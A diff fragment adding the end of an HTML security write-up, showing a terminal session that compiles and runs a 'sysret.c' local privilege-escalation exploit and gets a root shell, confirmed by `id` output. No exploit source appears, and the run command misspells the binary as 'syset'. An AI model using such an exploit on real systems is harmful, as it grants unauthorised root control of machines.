+                $&nbsp;<span style="color:#ff9d00;font-weight:700">gcc</span>&nbsp;sysret.c&nbsp;-o&nbsp;sysret&nbsp;<br>
+                sysret.c<span style="color:#ff9d00;font-weight:700">:</span>178<span style="color:#ff9d00;font-weight:700">:</span>2<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;warning<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;no&nbsp;newline&nbsp;at&nbsp;end&nbsp;of&nbsp;<span style="color:#ff9d00;font-weight:700">file</span><br>
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">chmod</span>&nbsp;+x&nbsp;sysret<br>
+                $&nbsp;.<span style="color:#ff9d00;font-weight:700">/</span>syset<br>
+                [+]&nbsp;SYSRET&nbsp;FUCKUP<span style="color:#ff9d00;font-weight:700">!!</span><br>
+                [+]&nbsp;Start&nbsp;Engine...<br>
+                [+]&nbsp;Crotz...<br>
+                [+]&nbsp;Crotz...<br>
+                [+]&nbsp;Crotz...<br>
+                [+]&nbsp;Woohoo<span style="color:#ff9d00;font-weight:700">!!!</span><br>
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">id</span><br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=0<span style="color:#ff9d00;font-weight:700">(</span>wheel<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=0<span style="color:#ff9d00;font-weight:700">(</span>wheel<span style="color:#ff9d00;font-weight:700">)</span>
+            </div>
+        </div>
+    </writeup>
+</section>
+</body>
+</html>
